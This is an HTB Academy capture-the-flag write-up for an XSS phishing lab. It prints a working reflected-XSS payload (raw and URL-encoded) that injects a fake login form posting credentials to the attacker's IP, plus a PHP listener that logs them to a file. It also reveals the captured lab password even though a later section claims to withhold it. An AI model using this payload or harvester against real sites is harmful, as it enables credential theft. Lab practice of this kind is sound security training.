# HTB Academy XSS Phishing Task Solution

This repository documents my complete solution to the Hack The Box (HTB) Academy Cross-Site Scripting (XSS) phishing task. The goal was to exploit an XSS vulnerability in an "Image URL" input field, inject a fake login form, capture victim credentials, and use them to retrieve a flag.

- **Attacker IP (My Machine):** `10.10.14.179` (where credentials are sent)
- **Target IP (HTB Server):** `10.129.9.211` (hosts the vulnerable app)
- **Date Solved:** April 10, 2025
- **Author:** Manoj (with assistance from Grok by xAI)

---

## Objective
Exploit the XSS vulnerability at `http://10.129.9.211/phishing/index.php?url=` to:
1. Inject a malicious login form that submits credentials to `10.10.14.179`.
2. Capture the victim's credentials using a PHP listener.
3. Log in at `http://10.129.9.211/phishing/login.php` with the captured credentials to get the flag.

---

## Step-by-Step Solution

### Step 1: Confirm XSS Vulnerability
1. **Access the Target Page:**
   - Navigate to: `http://10.129.9.211/phishing/index.php`
   - Identify the "Image URL" input field and submit button.

2. **Test Input Reflection:**
   - Enter: `test`, inspect the page source.
   - Expected: `<img src='test'>` → potential XSS.

3. **Test XSS Exploit:**
   - Input: `'><script>alert(1);</script>`
   - URL: `http://10.129.9.211/phishing/index.php?url='><script>alert(1);</script>`
   - Outcome: Alert pops up → XSS confirmed.

---

### Step 2: Craft the Malicious Payload

#### HTML:
```html
<h3>Please login to continue</h3>
<form action=http://10.10.14.179>
  <input type="username" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <input type="submit" name="submit" value="Login">
</form>
```

#### Raw Payload:
```javascript
'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.179><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```

#### URL Encoded Payload:
```
%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease%20login%20to%20continue%3C%2Fh3%3E%3Cform%20action%3Dhttp%3A%2F%2F10.10.14.179%3E%3Cinput%20type%3D%22username%22%20name%3D%22username%22%20placeholder%3D%22Username%22%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%20placeholder%3D%22Password%22%3E%3Cinput%20type%3D%22submit%22%20name%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E
```

#### Malicious URL:
```
http://10.129.9.211/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27...%3C%2Fscript%3E
```

---

### Step 3: Set Up the Listener

#### PHP Listener (index.php):
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://10.129.9.211/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

#### Command:
```bash
cd /tmp
nano index.php
sudo php -S 0.0.0.0:80 -t /tmp
```

Test with dummy credentials, check `/tmp/creds.txt`.

---

### Step 4: Send the Malicious URL

```
http://10.129.9.211/phishing/send.php?url=http://10.129.9.211/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27...
```

HTB bot visits, submits credentials, and they're logged.

---

### Step 5: Login and Get the Flag
- URL: `http://10.129.9.211/phishing/login.php`
- Username: `admin`
- Password: `happyhacking`
- Result: HTB{...}

---

### Step 6: Cleanup
```bash
Ctrl+C
rm /tmp/index.php /tmp/creds.txt
```

---

### Troubleshooting

- **No XSS?** Try `<img src=x onerror=alert(1)>`
- **No creds?** Check if server is listening and VPN is up.
- **Login fails?** Verify credentials captured properly.

---

### Tools Used

- Browser: Firefox
- Terminal: PHP Server
- OS: Kali Linux
- Editor: Nano

---

### Outcome

- Captured: `admin / (not giving because of HTB policy)`
- Flag: Successfully retrieved.

Happy hacking!
